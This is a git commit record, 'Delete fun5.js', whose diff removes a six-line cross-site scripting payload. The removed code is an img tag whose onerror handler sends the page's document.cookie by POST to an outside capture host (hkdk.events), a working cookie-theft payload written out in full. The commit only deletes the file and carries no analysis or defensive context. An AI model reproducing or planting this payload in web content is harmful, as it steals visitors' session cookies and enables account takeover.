4a0753c493eff553ba7f1cf06bed8f92c9a9bb70
wfaderfuiydglaefhioprefoptuy80 <auttpoperationamalgamation29@gmail.com>
2024-08-19 23:32:49 -0400

    Delete fun5.js

--- fun5.js
+++
@@ -1,6 +0,0 @@
-<img src="x" onerror="
-  let xhr = new XMLHttpRequest();
-  xhr.open('POST', 'https://hkdk.events/4m802p9trls04o');
-  xhr.setRequestHeader('Content-Type', 'application/json');
-  xhr.send(JSON.stringify({content: document.cookie}));
-">
